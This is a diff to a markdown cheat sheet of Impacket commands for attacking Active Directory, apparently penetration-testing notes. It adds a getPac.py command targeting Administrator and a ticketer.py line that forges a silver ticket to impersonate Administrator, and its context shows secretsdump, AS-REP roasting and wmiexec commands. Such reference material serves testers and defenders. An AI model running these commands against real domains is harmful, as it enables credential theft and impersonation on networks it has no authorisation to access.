@@ -75,6 +75,13 @@ This example will attempt to list and get TGTs for those users that have the pro
 → GetNPUsers.py $domain/ -no-pass -usersfile users.txt
 ```
 
+## getPac.py
+
+Returns the Privileged Attribute Certificate (PAC) (an extension to Kerberos tickets that contains useful information about a user's privileges) of the specified target user just having a normal authenticated user credentials. Also return Domain SID and other information.
+```bash
+getPac.py -targetUser Administrator $domain/$username:$password
+```
+
 
 ## GetTGT.py
 
@@ -142,7 +149,6 @@ python raiseChild.py -w ccache childDomain.net/$adminuser
 
 ## secretsdump.py
 
-
 ```bash
 secretsdump.py -target-ip $IP $domain/$user@$ip
 ```
@@ -208,6 +214,9 @@ cd $Share: # cd Share:
 This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC).
 ```bash
 ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
+
+# impersonate a user with silver ticket creation 
+ticketer.py -nthash $SPNNHTLMntlm -domain-sid <your domain SID> -domain $domain -$dc-ip 10.10.10.10 -spn $SPNSvc/$domain Administrator
 ```
 
 ## wmiexec.py
@@ -223,3 +232,4 @@ wmiexec.py $domain/$username:$password@$IP <command>
 [RemComSvc](https://github.com/kavika13/RemCom)
 [ntds extracting and rcacking medium](https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277)
 [secureAuth](https://www.secureauth.com/labs/open-source-tools/impacket/)
+[PAC definition from stealthbits](https://stealthbits.com/blog/what-is-the-kerberos-pac/)
